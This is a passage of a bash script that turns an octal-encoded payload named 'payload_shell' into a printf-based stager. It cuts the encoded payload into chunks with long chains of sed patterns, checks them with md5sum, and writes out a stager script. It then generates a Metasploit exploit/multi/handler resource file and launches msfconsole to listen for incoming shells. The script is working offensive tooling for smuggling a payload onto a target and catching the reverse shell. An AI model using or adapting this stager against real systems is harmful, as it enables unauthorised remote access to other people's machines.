[ -n "$(sed '/^:[0-9]:[0-9]:[1-9][0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[1-9][0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[1-9][0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
}
# "max_stgr_24" -> set_22_to_20 # This is don't work, 24 when use delete this cage.
# (20)
# --------------- A3
[ -n "$(sed '/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
# --------------- B3
[ -n "$(sed '/^:[1-9][0-9][0-9]:[1-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
# --------------- C3	
[ -n "$(sed '/^:[1-9][0-9][0-9]:[0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
# --------------- D3
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
# --------------- E3
[ -n "$(sed '/^:[0-9]:[0-9]:[0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
# (19)
# --------------- A4
[ -n "$(sed '/^:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]//1' -i octal_colon.txt && break
# --------------- B4
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
# --------------- C4
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
# (18)
# --------------- A5
[ -n "$(sed '/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
# --------------- B5
[ -n "$(sed '/^:[1-9][0-9][0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9][0-9]:[0-9]//1' -i octal_colon.txt && break
# --------------- C5
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
# --------------- D5
[ -n "$(sed '/^:[0-9]:[0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
# (17)
# --------------- A6
[ -n "$(sed '/^:[1-9][0-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
# --------------- B6
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
# (16)
# --------------- A7
[ -n "$(sed '/^:[1-9][0-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
# --------------- B7
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
# --------------- C7
[ -n "$(sed '/^:[0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
# (15)
# --------------- A8
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
# (14)
# --------------- A9
[ -n "$(sed '/^:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
# --------------- B9
[ -n "$(sed '/^:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]//1' -i octal_colon.txt && break
# (13)
# --------------- A10
[ -n "$(sed '/^:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]//1' -i octal_colon.txt && break
# (12)
# --------------- A11
[ -n "$(sed '/^:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt
[ -z "$(sed 's/[0-9:]\{1,3\}//1' octal_colon.txt)" ] && final_break="0" && break || echo -e '\nSomething Problem! (no line should be found at the end of the process) exit\n'
[ -z "$(sed 's/[0-9:]\{1,3\}//1' octal_colon.txt)" ] || exit
# [ -z "$(sed 's/^:[0-9]://1;/^[[:space:]]*$/d;s/[ ]//g' octal_colon.txt)" ]
# It will permanently breakout when the values are exhausted.
done
# The final loop checks the file is empty and the process end.
[ -n "$final_break" ] && break
done

mv /tmp/octal_colon.txt octal_colon.txt
fi # (end stager method proc)

# md5sum final check
[ -n "$(echo "$1" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] && var_pname='payload_shell' || var_pname="$1"
if [ "$(tr -d '\n' < oc_part.txt | md5sum)" = "$(cat octal_colon.txt | tr -d '\n' | md5sum)" ] && [ "$(printf "$(sed 's/:/\\/g' oc_part.txt | tr -d '\n')" | md5sum)" = "$(cat "$var_pname" | md5sum)" ]; then
echo -e '\nmd5sum -> OK! Usefull staged payload! :-)'
else
echo -e '\nmd5sum -> FAIL! NO use this staged payload! (something error, exit)\n'
exit
fi
sed 's/.*/printf "&">>M/g;1s/>>/>/;s/:/\\/g' -i oc_part.txt

if [ "$2" = "fast" ]; then
mv oc_part.txt raw_stager_fast.sh
echo -e "\nuse file -> printf_stager_fast.sh (row: $(cat raw_stager_fast.sh | wc -l))\n"
else
mv oc_part.txt raw_stager_spec.sh
echo -e "\nuse file -> printf_stager_spec.sh (row: $(cat raw_stager_spec.sh | wc -l))\n"
fi

if [ "$2" = "yes" ] || [ "$2" = "y" ] || [ "$2" = "Y" ] || [ "$2" = "-y" ] || [ -n "$(echo "$2" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] || [ "$3" = "yes" ] || [ "$3" = "y" ] || [ "$3" = "Y" ] || [ "$3" = "-y" ] || [ -n "$(echo "$3" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] || [ -n "$(echo "$4" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ]; then
echo -e '\nchosen: metasploit start yes (set default payload, can be changed in script)\n'

if [ -n "$(echo "$2" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] || [ -n "$(echo "$3" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] || [ -n "$(echo "$4" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ]; then
[ -n "$(echo "$2" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] && echo -e "\nset msf LHOST: $2\n" && vLHOST="$2"
[ -n "$(echo "$3" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] && echo -e "\nset msf LHOST: $3\n" && vLHOST="$3"
[ -n "$(echo "$4" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] && echo -e "\nset msf LHOST: $4\n" && vLHOST="$4"
else
[ -n "$(echo "$vLHOST" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] && echo -e "\nNo specify <SET_MSF_LHOST>, use: ($1)\n"
[ -z "$(echo "$vLHOST" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] && vLHOST='0.0.0.0' && echo -e '\nNo IP input <SET_MSF_LHOST>, set all listener (0.0.0.0)\n'
fi
# vLHOST='DIRECT_ADD !!!'
cat << _EOF_ > msf_start.rc
use exploit/multi/handler
set payload $vPAYLOAD
set LHOST $vLHOST
set LPORT $vLPORT
exploit
rm msf_start.rc
_EOF_
service postgresql start
msfdb init
msfconsole -q -r msf_start.rc
fi




